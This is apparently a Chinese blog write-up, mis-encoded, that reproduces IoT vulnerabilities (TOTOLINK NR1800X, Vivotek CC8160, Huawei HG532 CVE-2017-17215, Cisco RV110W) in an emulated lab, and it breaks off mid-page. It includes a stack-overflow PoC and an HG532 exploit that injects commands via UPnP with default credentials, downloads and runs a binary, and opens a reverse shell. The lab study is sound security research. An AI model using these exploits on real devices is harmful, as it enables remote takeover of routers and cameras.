firmianay/qemu-system:mipsel</code></li></ul><h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p>è§£å‹æå–å›ºä»¶ï¼š</p><blockquote><p>docker run â€“rm -v $PWD&#x2F;firmware&#x2F;:&#x2F;root&#x2F;firmware firmianay&#x2F;binwalk -Mer â€œ&#x2F;root&#x2F;firmware&#x2F;TOTOLINK_NR1800X_B20210910_ALL.binâ€</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251903763.png" alt="image-20240623135537006"></p><p>æŸ¥çœ‹æ–‡ä»¶ç›¸å…³ä¿¡æ¯  32ä½ å°ç«¯åº mipsæ¶æ„</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251903687.png" alt="image-20240623135819202"></p><p>1.æ„å»ºã€å¯åŠ¨æ¼æ´ç¯å¢ƒï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./init_env.sh mipsel</span><br><span class="line">docker-compose -f docker-compose-system.yml build</span><br></pre></td></tr></table></figure><p>a.ç¼ºå°‘firmianay&#x2F;qemu-system:mipselï¼Œè‡ªè¡Œæœ¬åœ°æ„å»ºï¼Œå»åˆ°å¯¹åº”çš„æ–‡ä»¶å¤¹IoT-vulhub-master&#x2F;baseImage&#x2F;qemu-system&#x2F;mipselåˆ›å»ºé•œåƒ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t firmianay/qemu-system:mipsel .</span><br></pre></td></tr></table></figure><p>b.æ„å»ºæ—¶COPYå‘½ä»¤å‡ºé”™ï¼Œç”±äºé«˜ç‰ˆæœ¬dockerä¼šå¯¹æ–‡ä»¶åæ£€æµ‹ï¼Œéœ€è¦ä¿®æ”¹Dockerfile</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Step <span class="number">4</span>/<span class="number">8</span> : <span class="keyword">COPY</span><span class="language-bash"> ./firmware/_*/squashfs-root /root/squashfs-root</span></span><br><span class="line">ERROR: Service <span class="string">&#x27;system-emu&#x27;</span> failed to build: When using <span class="keyword">COPY</span><span class="language-bash"> with more than one <span class="built_in">source</span> file, the destination must be a directory and end with a /</span></span><br></pre></td></tr></table></figure><p>c.å°†firmwareä¸‹å­æ–‡ä»¶å¤¹å†…çš„squashfs-rootæå–åˆ°firmwareé‡Œï¼Œä¿®æ”¹Dockerfileçš„æ­¥éª¤ä¸º  COPY .&#x2F;firmware&#x2F;squashfs-root &#x2F;root&#x2F;squashfs-root</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp -r ./_TOTOLINK_NR1800X_B20210910_ALL.bin.extracted/squashfs-root/ ./</span><br></pre></td></tr></table></figure><p>2.å¯åŠ¨å®¹å™¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose -f docker-compose-system.yml up</span><br></pre></td></tr></table></figure><p>d.è¿è¡Œçˆ†é”™TOTO-system   | &#x2F;bin&#x2F;sh: 1: .&#x2F;run.sh: Permission deniedï¼ŒæœåŠ¡æ²¡èµ·èµ·æ¥</p><blockquote><p>Dockerfileä¸­æ·»åŠ   RUN chmod +x &#x2F;bin&#x2F;run.sh</p></blockquote><p>e.é‡æ–°æ„å»ºå¯åŠ¨ï¼Œä¼šçˆ†ç¼ºå°‘debian_wheezy_mipsel_standard.qcow2æ–‡ä»¶ï¼Œè¿™æ˜¯åœ¨æˆ‘ä»¬qwmu-systemæ„å»ºæ—¶(aæ­¥éª¤)ä¸­è¿›è¡Œæ„å»ºï¼Œæˆ‘ä»¬éœ€è¦æœ¬åœ°ä¸‹è½½ä¸‹æ¥ï¼Œé‡æ–°èµ°ä¸€é12æ­¥éª¤</p><blockquote><p>ä¿®æ”¹&#x2F;iot_hub&#x2F;IoT-vulhub-master&#x2F;baseImage&#x2F;qemu-system&#x2F;mipsel&#x2F;images&#x2F;download.shï¼ŒåŸé“¾æ¥æ”¹ä¸º<a href="https://people.debian.org/~aurel32/qemu/mipsel/">https://people.debian.org/~aurel32/qemu/mipsel/</a></p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">vim ./download.sh</span><br><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line"># 3.2.0</span><br><span class="line">wget https://people.debian.org/~aurel32/qemu/mipsel/debian_wheezy_mipsel_standard.qcow2</span><br><span class="line">wget https://people.debian.org/~aurel32/qemu/mipsel/vmlinux-3.2.0-4-4kc-malta</span><br><span class="line"></span><br><span class="line"># 2.6.32</span><br><span class="line">wget https://people.debian.org/~aurel32/qemu/mipsel/debian_squeeze_mipsel_standard.qcow2</span><br><span class="line">wget https://people.debian.org/~aurel32/qemu/mipsel/vmlinux-2.6.32-5-4kc-malta</span><br><span class="line"></span><br><span class="line">./download.sh</span><br></pre></td></tr></table></figure><p>æœåŠ¡å¯åŠ¨æˆåŠŸï¼</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251902277.png" alt="image-20240623143052731"></p><p>3.å¼€å¯sshéš§é“</p><p>æœ¬åœ°ä½¿ç”¨sshåˆ›å»ºsocksä»£ç†ï¼Œç„¶åæµè§ˆå™¨é…ç½®ä»£ç†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -D 10006 root@124.221.122.67 -p 1234</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251903524.png" alt="image-20240623153609456"></p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251903795.png" alt="image-20240623152246628"></p><p>æˆåŠŸè®¿é—®æœåŠ¡è·¯ç”±</p><p>è¿è¡Œexp.pyï¼Œæ‰“é€š</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251903991.png" alt="image-20240623153513904"></p><h2 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><p>CVE-2022-41525çš„æˆå› æ˜¯cstecgi.cgiçš„doSystemè¿‡æ»¤ä¸ä¸¥è°¨ï¼Œå°†cstecgi.cgi ä¼ ä¸‹æ¥è¿›è¡Œåˆ†æ</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251902852.png" alt="image-20240623153858761"></p><p>é€šè¿‡dosystemäº¤å‰è°ƒç”¨å¯»æ‰¾æ¼æ´ç‚¹ï¼Œ</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251904405.png" alt="image-20240623154248447"></p><p>idaä¸æ”¯æŒmipsçš„åæ±‡ç¼–ï¼Œéœ€è¦ä¸‹è½½Retdecæ’ä»¶ï¼Œä½†æ˜¯æœ‰ç‚¹å¤§äº†ï¼Œæ‰€ä»¥æˆ‘ä½¿ç”¨ghidraè¿›è¡Œåç¼–è¯‘</p><p>&#x2F;cgi-bin&#x2F;cstecgi.cgi çš„ UploadFirmwareFile å‡½æ•°ï¼Œå…¶å‚æ•°FileNameå‚æ•°å¯æ§ï¼Œå¹¶ä¸”å°†ä½œä¸ºdoSystemçš„å‚æ•°è¢«æ‰§è¡Œã€‚</p><p>è¿™ä¸ªå‘½ä»¤æ³¨å…¥ä¸éœ€è¦è¿›è¡Œç»•è¿‡ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251902945.png" alt="image-20240623164123142"></p><h1 id="Vivotek-CC8160-æ ˆæº¢å‡ºæ¼æ´"><a href="#Vivotek-CC8160-æ ˆæº¢å‡ºæ¼æ´" class="headerlink" title="Vivotek CC8160 æ ˆæº¢å‡ºæ¼æ´"></a>Vivotek CC8160 æ ˆæº¢å‡ºæ¼æ´<a id="VIVOTEK"></a></h1><p><a href="https://xz.aliyun.com/t/5054?time__1311=n4+xnD07iti=j2DBqooGkYd0QeG=Q8DRjoD&alichlgref=https://xz.aliyun.com/t/5054#toc-4">Vivotekè¿œç¨‹æ ˆæº¢å‡ºæ¼æ´åˆ†æä¸å¤ç° - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p><h2 id="æ¼æ´ç¯å¢ƒ-1"><a href="#æ¼æ´ç¯å¢ƒ-1" class="headerlink" title="æ¼æ´ç¯å¢ƒ"></a>æ¼æ´ç¯å¢ƒ</h2><ul><li>dockerï¼šæ”»å‡»ã€è°ƒè¯•ä¸»æœºï¼š192.168.2.1</li><li>qemu-systemï¼šå›ºä»¶ä¸»æœºï¼š192.168.2.2</li><li>httpdï¼ˆæœ‰æ¼æ´æœåŠ¡ï¼‰ï¼š192.168.2.2:80</li><li>é•œåƒä¾èµ–ï¼š<code>firmianay/ubuntu1604 -&gt; firmianay/qemu-system:armel</code></li></ul><h2 id="ç¯å¢ƒæ­å»º-1"><a href="#ç¯å¢ƒæ­å»º-1" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p>åœ¨æ¼æ´è·¯å¾„ä¸‹  ä½¿ç”¨ firmianay&#x2F;binwalk è§£å‹å›ºä»¶</p><blockquote><p>docker run â€“rm -v $PWD&#x2F;firmware&#x2F;:&#x2F;root&#x2F;firmware firmianay&#x2F;binwalk -Mer â€œ&#x2F;root&#x2F;firmware&#x2F;DIR822A1_FW103WWb03.binâ€</p></blockquote><h3 id="ç”¨æˆ·æ¨¡æ‹Ÿ"><a href="#ç”¨æˆ·æ¨¡æ‹Ÿ" class="headerlink" title="ç”¨æˆ·æ¨¡æ‹Ÿ"></a>ç”¨æˆ·æ¨¡æ‹Ÿ</h3><p>æ„å»ºå¹¶å¯åŠ¨æ¼æ´ç¯å¢ƒ:</p><blockquote><p>docker-compose -f docker-compose-user.yml build</p></blockquote><p>è¿™é‡Œæ„å»ºç¯å¢ƒå‡ºç°é—®é¢˜ç¼ºå°‘firmianay&#x2F;qemu-user-static é•œåƒæ–‡ä»¶ï¼Œdocker.ioä¸­æ²¡æœ‰å¯¹åº”çš„é•œåƒæ–‡ä»¶ï¼Œæˆ‘ä»¬éœ€è¦åˆ°~&#x2F;iot_hub&#x2F;IoT-vulhub-master&#x2F;baseImage&#x2F;qemu-user-staticé‡Œé¢è‡ªè¡Œæ„å»º</p><blockquote><p>cd ~&#x2F;iot_hub&#x2F;IoT-vulhub-master&#x2F;baseImage&#x2F;qemu-user-static</p><p>docker build -t firmianay&#x2F;qemu-user-static.</p></blockquote><p>ç„¶åå°±èƒ½æˆåŠŸåœ¨æœ¬åœ°æ„å»ºé•œåƒ</p><p>é‡æ–°æ„å»ºå¯åŠ¨å®¹å™¨ï¼Œèƒ½å¤ŸæˆåŠŸè¿è¡ŒæœåŠ¡</p><blockquote><p>docker-compose -f docker-compose-user.yml build</p><p>docker-compose -f docker-compose-user.yml up</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251859341.png" alt="image-20240625185942262"></p><h3 id="ç³»ç»Ÿæ¨¡æ‹Ÿ"><a href="#ç³»ç»Ÿæ¨¡æ‹Ÿ" class="headerlink" title="ç³»ç»Ÿæ¨¡æ‹Ÿ"></a>ç³»ç»Ÿæ¨¡æ‹Ÿ</h3><p>å…ˆè‡ªè¡Œæ„å»ºqemu-systemé•œåƒ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cd ~/iot_hub/IoT-vulhub-master/baseImage/qemu-system/armel/images</span><br><span class="line">./download.sh   #è®°å¾—æ”¹é“¾æ¥</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">é•œåƒæ„å»º</span></span><br><span class="line">docker build -t firmianay/qemu-system:$&#123;ARCH&#125; .</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¦‚æœæ„å»ºqemu-systemæ—¶gefæ‹‰å–ä¸ä¸‹æ¥å°±æ³¨é‡Šæ‰</p><p> ç„¶åè·Ÿç€æ‰‹å†Œèµ°</p><p>è¾“å…¥pocå‘ç°ç³»ç»ŸæœåŠ¡dumpäº†</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251900140.png" alt="image-20240622212015099"></p><h2 id="æ¼æ´å¤ç°-1"><a href="#æ¼æ´å¤ç°-1" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><p>å›ºä»¶è§£åŒ…åæŸ¥çœ‹æ¼æ´æ–‡ä»¶</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251923337.png" alt="image-20240625192328286"></p><p>æ¼æ´åˆ†æï¼š</p><p>æ¼æ´ç‚¹ä½äº&#x2F;usr&#x2F;sbin&#x2F;httpdä¸­çš„sub_17F80ï¼Œç”±äºContent-Lengthå¼•èµ·çš„æº¢å‡º</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251953973.png" alt="image-20240625195352919"></p><p>uVar6æ˜¯ â€œContent-Lengthâ€ çš„åˆå§‹åœ°å€</p><p>è€ŒiVar3 ã€4æ˜¯åœ¨å­—ç¬¦ä¸²ä¸­â€œ\nâ€å’Œâ€œ:â€é¦–æ¬¡å‡ºç°çš„åœ°å€ï¼ŒäºŒè€…ä¹‹é—´ä¹Ÿå°±æ˜¯è¾“å…¥çš„æ¶ˆæ¯</p><p>é€šè¿‡strncpyæ¥å°†iVar4 + 1 (Content-Length_value)çš„ iVar3 - (iVar4 + 1) å­—èŠ‚(Content-Length_len)æ•°æ®copyåˆ° &amp;local_38</p><p>ç¨‹åºæ²¡æœ‰å¯¹Content-lengthå­—æ®µè¿›è¡Œæ ¡éªŒï¼Œç›´æ¥å°†è¾“å…¥çš„æ¶ˆæ¯èµ‹å€¼ç»™äº†local_38ä¸­ï¼Œè€Œlocal_38è·ç¦»æ ˆåº•åªæœ‰0x38å­—èŠ‚</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406252002547.png" alt="image-20240625200208487"></p><p>poc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!usr/bin/python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">header = &#123;</span><br><span class="line"><span class="string">&quot;Content-Length&quot;</span>:<span class="string">&quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://192.168.2.2&quot;</span> + <span class="string">&quot;/cgi-bin/admin/upgrade.cgi&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">session.post(url, headers=header)</span><br></pre></td></tr></table></figure><h1 id="åä¸º-HG532-è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2017-17215ï¼‰"><a href="#åä¸º-HG532-è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2017-17215ï¼‰" class="headerlink" title="åä¸º HG532 è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2017-17215ï¼‰"></a>åä¸º HG532 è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2017-17215ï¼‰<a id="HG532"></a></h1><p><a href="https://www.cnblogs.com/L0g4n-blog/p/15613816.html">æ¼æ´åˆ†æï¼šCVE-2017-17215 - Riv4ille - åšå®¢å›­ (cnblogs.com)</a></p><h2 id="æ¼æ´ç¯å¢ƒ-2"><a href="#æ¼æ´ç¯å¢ƒ-2" class="headerlink" title="æ¼æ´ç¯å¢ƒ"></a>æ¼æ´ç¯å¢ƒ</h2><ul><li>dockerï¼šæ”»å‡»ã€è°ƒè¯•ä¸»æœºï¼š192.168.2.1</li><li>qemu-systemï¼šå›ºä»¶ä¸»æœºï¼š192.168.2.2</li><li>uhttpdï¼ˆæœ‰æ¼æ´ Web æœåŠ¡å™¨ï¼‰ï¼š192.168.2.2:80</li><li>é•œåƒä¾èµ–ï¼š<code>firmianay/ubuntu1604 -&gt; firmianay/qemu-system:mips</code></li></ul><h2 id="ç¯å¢ƒæ­å»º-2"><a href="#ç¯å¢ƒæ­å»º-2" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p>è§£å‹å›ºä»¶</p><blockquote><p>docker run â€“rm -v $PWD&#x2F;firmware&#x2F;:&#x2F;root&#x2F;firmware firmianay&#x2F;binwalk -Mer â€œ&#x2F;root&#x2F;firmware&#x2F;HG532eV100R001C01B020_upgrade_packet.binâ€</p></blockquote><p>å›ºä»¶åˆ†æ 32ä½ mipsæ¶æ„ å°ç«¯åº</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406261004016.png" alt="image-20240626100451970"></p><p>å‰©ä¸‹æ­¥éª¤ä¸TOTOLINK NR1800Xç›¸åŒï¼Œæœ¬åœ°æ„å»ºqemu-systemé•œåƒï¼Œç„¶åæ„å»ºæ¼æ´ç¯å¢ƒï¼Œå¯åŠ¨ç¯å¢ƒ</p><blockquote><p>#åˆ°squashfs-rootæ‰€åœ¨ç›®å½•</p><p>cp -r .&#x2F;squashfs-root&#x2F; ..&#x2F;</p><p>#æ”¹Dockerfileæ–‡ä»¶ç›®å½•</p><p>#æ„å»ºæœ¬åœ°qemu-systemé•œåƒ</p><p>docker build -t firmianay&#x2F;qemu-system:mips .</p><p>docker-compose -f docker-compose-system.yml build</p><p>docker-compose -f docker-compose-system.yml up</p></blockquote><p>ä½¿ç”¨sshè®¾ç½®socks ä»£ç†åï¼Œé…ç½®æµè§ˆå™¨ä»£ç†ï¼Œç„¶åç™»é™† Web åå° <a href="http://192.168.2.2/%EF%BC%8C%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%8A%A5%E9%94%99">http://192.168.2.2/ï¼ŒæœåŠ¡ç«¯æŠ¥é”™</a></p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406260004775.png" alt="image-20240625234908598"></p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406260909274.png" alt="image-20240626090924119"></p><p>æœ¬åœ°ä»£ç†è¿æ¥æµ‹è¯•ï¼ŒæˆåŠŸè¿æ¥åˆ°äº†192.168.2.2å¹¶ä¸”é‡å®šå‘åˆ°<a href="https://192.168.2.2/">https://192.168.2.2</a></p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406260912255.png" alt="image-20240626091219207"></p><p>æµ‹è¯•httpsè¿æ¥</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406260914069.png" alt="image-20240626091406016"></p><p>å‘ç°æ˜¯æ¥æ”¶åˆ°äº†SSLè¯ä¹¦é”™è¯¯ï¼Œæ·»åŠ -ké€‰é¡¹ï¼Œå¿½ç•¥SSLè¯ä¹¦éªŒè¯</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406260916879.png" alt="image-20240626091654813"></p><p>æˆåŠŸè®¿é—®æœåŠ¡ï¼</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406261029907.png" alt="image-20240626094931147"></p><p>ç…§ç€æ–‡æ¡£æ‰“é€šäº†<img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406260045636.png" alt="image-20240626004523543"></p><h2 id="æ¼æ´å¤ç°-2"><a href="#æ¼æ´å¤ç°-2" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><p>è¯¦ç»†çš„æ§åˆ¶æµåˆ†æä»¥åŠUPnPåè®®çš„å­¦ä¹ æœ‰äº›å¿ƒæœ‰ä½™è€ŒåŠ›ä¸è¶³äº†</p><p>ç®€å•åˆ†æä¸€ä¸‹upnpé‡Œé¢çš„å…³é”®æ¼æ´ä»£ç </p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406261030685.png" alt="image-20240626101528081"></p><p>è¿™é‡Œè°ƒç”¨äº†snprintf(a0, a1, a2, a3)</p><p>å³snprintf(a0, 0x400, â€œupg -g -U %s -t â€˜1 Firmware Upgrade Imaâ€, a3)</p><p>a0æºæ“ä½œæ•°ï¼Œa1ä¸ºsizeï¼Œa2ä¸ºæ ¼å¼åŒ–å­—ç¬¦ï¼Œa3ä¸ºæŒ‡å®šæ ¼å¼åŒ–çš„æ•°æ®</p><p>a0åˆæ˜¯snprintfçš„æºæ“ä½œæ•°ï¼Œä¹Ÿæ˜¯systemè°ƒç”¨çš„å‚æ•°ï¼Œæœ€åä¼šæ‰§è¡Œsystem(a0)</p><p>exp:æœ€ç»ˆæ‰§è¡Œcmd</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> requests.auth <span class="keyword">import</span> HTTPDigestAuth</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"></span><br><span class="line"><span class="comment"># cmd = &quot;busybox wget -g 192.168.2.1 -P 8000 -l /tmp/busybox -r /tools/busybox ; chmod +x /tmp/busybox ; /tmp/busybox nc 192.168.2.1 7777 -e /bin/sh&quot;</span></span><br><span class="line">cmd  = <span class="string">&#x27;wget -g 192.168.2.1 -P 8000 -r /tools/msf -l /msf\n&#x27;</span></span><br><span class="line">cmd += <span class="string">&#x27;chmod 777 /msf\n&#x27;</span></span><br><span class="line">cmd += <span class="string">&#x27;/msf&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">len</span>(cmd) &lt; <span class="number">255</span>)</span><br><span class="line"></span><br><span class="line">data = <span class="string">&quot;&lt;?xml version=\&quot;1.0\&quot; ?&gt;\n    &lt;s:Envelope xmlns:s=\&quot;http://schemas.xmlsoap.org/soap/envelope/\&quot; s:encodingStyle=\&quot;http://schemas.xmlsoap.org/soap/encoding/\&quot;&gt;\n    &lt;s:Body&gt;&lt;u:Upgrade xmlns:u=\&quot;urn:schemas-upnp-org:service:WANPPPConnection:1\&quot;&gt;\n    &lt;NewStatusURL&gt;$(&quot;</span> + cmd + <span class="string">&quot;)&lt;/NewStatusURL&gt;\n&lt;NewDownloadURL&gt;$(echo HUAWEIUPNP)&lt;/NewDownloadURL&gt;\n&lt;/u:Upgrade&gt;\n    &lt;/s:Body&gt;\n    &lt;/s:Envelope&gt;&quot;</span></span><br><span class="line">url = <span class="string">&quot;http://192.168.2.2:37215/ctrlt/DeviceUpgrade_1&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        requests.post(url, auth=HTTPDigestAuth(<span class="string">&#x27;dslf-config&#x27;</span>, <span class="string">&#x27;admin&#x27;</span>), data=data)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line">thread = Thread(target=attack)</span><br><span class="line">thread.start()</span><br><span class="line"></span><br><span class="line">io = listen(<span class="number">31337</span>)</span><br><span class="line">io.wait_for_connection()</span><br><span class="line">log.success(<span class="string">&quot;getshell&quot;</span>)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line">thread.join()</span><br></pre></td></tr></table></figure><h1 id="Cisco-RV110W-è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2020-3331ï¼‰"><a href="#Cisco-RV110W-è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2020-3331ï¼‰" class="headerlink" title="Cisco RV110W è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2020-3331ï¼‰"></a>Cisco RV110W è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2020-3331ï¼‰<a id="CISCO"></a></h1><p>éš¾é¢˜çš„å¤ç°æ‰¾æ¥æ‰¾å»åªæœ‰é‚£ä¹ˆå‡ ä½å¸ˆå‚…</p><p><a href="https://xuanxuanblingbling.github.io/iot/2020/10/26/rv110w/">æ€ç§‘è·¯ç”±å™¨ RV110W CVE-2020-3331 æ¼æ´å¤ç° | Clangè£ç¼åº— (xuanxuanblingbling.github.io)</a></p><p>[<a href="https://bbs.kanxue.com/thread-271900.htm">åŸåˆ›]Cisco RV110W è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æ(CVE-2020-3331)-äºŒè¿›åˆ¶æ¼æ´-çœ‹é›ª-å®‰å…¨ç¤¾åŒº|å®‰å…¨æ‹›è˜|kanxue.com</a></p><p>æ€ç§‘æ— çº¿è·¯ç”±å™¨</p><h2 id="æ¼æ´ç¯å¢ƒ-3"><a href="#æ¼æ´ç¯å¢ƒ-3" class="headerlink" title="æ¼æ´ç¯å¢ƒ"></a>æ¼æ´ç¯å¢ƒ</h2><ul><li>dockerï¼šæ”»å‡»ã€è°ƒè¯•ä¸»æœºï¼š192.168.2.1</li><li>qemu-systemï¼šå›ºä»¶ä¸»æœºï¼š192.168.2.2</li><li>httpdï¼ˆæœ‰æ¼æ´ Web æœåŠ¡å™¨ï¼‰ï¼š192.168.2.2:80</li><li>é•œåƒä¾èµ–ï¼š<code>firmianay/ubuntu1604 -&gt; firmianay/qemu-system:mipsel</code></li></ul><h2 id="ç¯å¢ƒæ­å»º-3"><a href="#ç¯å¢ƒæ­å»º-3" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p>è§£å‹å›ºä»¶</p><blockquote><p>docker run â€“rm -v $PWD&#x2F;firmware&#x2F;:&#x2F;root&#x2F;firmware firmianay&#x2F;binwalk -Mer â€œ&#x2F;root&#x2F;firmware&#x2F;RV110W_FW_1.2.2.5.binâ€</p></blockquote><p>æ„å»ºå¯åŠ¨ç¯å¢ƒ</p><blockquote><p>.&#x2F;init_env.sh mipsel</p><p>docker-compose -f docker-compose-system.yml build</p><p>docker-compose -f docker-compose-system.yml up</p></blockquote><p>dockerå†…è¿›è¡Œç«¯å£è½¬å‘(Docker-compose.ymlä¸­å†™å¥½äº†ç«¯å£æ˜ å°„)</p><blockquote><p>ssh <a href="mailto:&#x72;&#x6f;&#x6f;&#x74;&#64;&#49;&#x32;&#x37;&#x2e;&#48;&#x2e;&#48;&#x2e;&#49;">&#x72;&#x6f;&#x6f;&#x74;&#64;&#49;&#x32;&#x37;&#x2e;&#48;&#x2e;&#48;&#x2e;&#49;</a> -f -N -g -R 0.0.0.0:6666:192.168.2.2:6666</p><p>ssh <a href="mailto:&#x72;&#x6f;&#111;&#116;&#x40;&#49;&#x32;&#x37;&#46;&#48;&#x2e;&#x30;&#46;&#x31;">&#x72;&#x6f;&#111;&#116;&#x40;&#49;&#x32;&#x37;&#46;&#48;&#x2e;&#x30;&#46;&#x31;</a> -f -N -g -R 0.0.0.0:80:192.168.2.2:80</p></blockquote><p>nmapå¯ä»¥æ‰«åˆ°æœåŠ¡  8888â€“æ¼æ´æœåŠ¡    6666â€“gdbserver</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406262320963.png" alt="image-20240626231935303"></p><p>è¿è¡Œexpï¼Œæ‰“é€š</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406262355451.png" 